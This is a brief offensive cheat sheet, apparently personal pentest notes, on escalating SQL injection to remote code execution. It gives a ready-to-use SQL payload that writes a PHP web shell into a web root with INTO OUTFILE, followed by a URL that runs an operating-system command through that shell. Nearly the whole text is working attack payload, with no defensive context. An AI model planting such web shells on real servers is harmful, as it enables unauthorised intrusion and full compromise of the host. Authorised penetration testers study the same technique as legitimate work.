# SQLi

First thing to check in an SQLi is RCE capabilities (file write or OS command execution)

### 1) File write

    SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"

### 2) Execute payload on webserver

    https://target.com/webshell.php?cmd=id

